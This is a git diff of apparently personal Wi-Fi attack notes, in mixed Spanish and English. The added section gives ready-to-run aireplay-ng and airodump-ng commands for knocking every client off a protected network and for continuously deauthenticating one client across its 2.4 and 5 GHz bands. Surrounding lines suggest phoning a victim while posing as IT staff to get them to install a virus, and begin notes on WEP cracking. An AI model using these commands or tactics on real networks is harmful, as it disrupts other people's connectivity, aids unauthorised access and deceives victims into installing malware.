@@ -103,6 +103,26 @@ airodump-ng --bssid (BSSID) --channel (Nº) mon0
 ```
 podemos por ejemplo llamar al usuario y decirle que somos del departamento it y convencerles de que instalen un virus
 
+Deauthenticating All Clients From Protected WiFi Network
+```
+Terminal 1
+airodump-ng --bssid (BSSID) --channel (Nº) mon0
+Terminal 2
+aireplay-ng --deauth 10000000 -a (BSSID) mon0
+```
+
+Deauthenticating Same Clien From Multiple Bands or Networks
+```
+Terminal 1
+airodump-ng --bssid (BSSID) --channel (Nº 2.4gh) mon0
+Terminal 2
+airodump-ng --bssid (BSSID) --channel (Nº 5gh) mon0
+Terminal 3 (Deaut from 2.4 network)
+aireplay-ng --deauth 0 -a (BSSID) -c (STATION) mon0
+Terminal 4 (deaut from 5GH network)
+aireplay-ng --deauth 0 -a (BSSID) -c (STATION) -D mon0
+```
+
 WEP Cracking:  
 Initialization Vector (IV) + Key (Wifi Pasword) = Keystream  
 Keystream + Data = Encripted data que se envia al ruter con el IV adjuntado para que el ruter la decodifique  
